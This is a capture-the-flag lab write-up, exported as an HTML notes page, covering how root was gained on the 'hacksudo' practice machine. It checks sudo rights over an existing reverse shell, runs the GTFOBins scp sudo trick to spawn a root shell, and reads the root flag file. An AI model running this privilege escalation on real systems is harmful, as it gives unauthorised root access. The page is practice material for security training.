<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5.1 Running shell commands. (Fourth flag)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">5.1 Running shell commands. (Fourth flag)</h1><br/><br />1. Check the sudo permissions of the user from the “reverse shell” connection.<br />	<div class="codebox"><div class="codebox">hacksudo@hacksudo<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#6a5acd;font-weight:400">$sudo</span>&nbsp;-l<br /></div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>		<br />	<img src="images/593-1.png" alt="images/593-1.png" /><br />	<br />	The user can run “scp” as “root” with no password.<br />	<br />2. From <a href="https://gtfobins.github.io/gtfobins/scp/#sudo.">https://gtfobins.github.io/gtfobins/scp/#sudo.</a><br /><br /><strong>Sudo</strong><br />If the binary is allowed to run as superuser by <code>sudo</code>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.<br /><code>TF=$(mktemp)<br />echo 'sh 0&lt;&amp;2 1&gt;&amp;2' &gt; $TF<br />chmod +x "$TF"<br />sudo scp -S $TF x y:</code>    <br />    <br />3. Run the four lines on the “reverse shell”.<br />	<div class="codebox"><div class="codebox">hacksudo@hacksudo<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#6a5acd;font-weight:400">$TF</span>=$<span style="color:#a52a2a;font-weight:700">(mktemp)</span><br />hacksudo@hacksudo<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#6a5acd;font-weight:400">$echo</span>&nbsp;<span style="color:#ff00ff;font-weight:400">'sh&nbsp;0&lt;&amp;2&nbsp;1&gt;&amp;2'</span>&nbsp;&gt;&nbsp;<span style="color:#6a5acd;font-weight:400">$TF</span><br />hacksudo@hacksudo<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#6a5acd;font-weight:400">$chmod</span>&nbsp;+x&nbsp;<span style="color:#ff00ff;font-weight:400">"$TF"</span><br />hacksudo@hacksudo<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#6a5acd;font-weight:400">$sudo</span>&nbsp;<span style="color:#a52a2a;font-weight:700">scp</span>&nbsp;-S&nbsp;<span style="color:#6a5acd;font-weight:400">$TF</span>&nbsp;x&nbsp;y<span style="color:#a52a2a;font-weight:700">:</span></div></div><br />	<br />4. Run the command “id".<br />	<div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">id</span></div></div><br /><br />	<span style="color:#ffa500;">Output:</span>	<br />	<img src="images/593-2.png" alt="images/593-2.png" /><br />	<br />5. Get the flag.<br />	<div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>root<br /><span style="color:#a52a2a;font-weight:700">ls</span><br /><span style="color:#a52a2a;font-weight:700">cat</span>&nbsp;root.txt</div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>		<br />	<img src="images/593-3.png" alt="images/593-3.png" /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>